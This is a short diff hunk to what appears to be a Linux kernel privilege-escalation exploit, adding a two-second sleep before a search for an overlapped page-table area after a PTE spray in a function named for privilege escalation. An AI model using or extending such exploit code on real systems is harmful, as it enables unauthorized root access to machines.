@@ -356,6 +356,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	// find overlapped PTE area
 	pte_area = NULL;
 	printf("[*] SLEEP 2s before search...\n");
+	sleep(2);
 	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
 	{
 		unsigned long long *test_target_addr = PTI_TO_VIRT(2, 0, i, 0, 0);
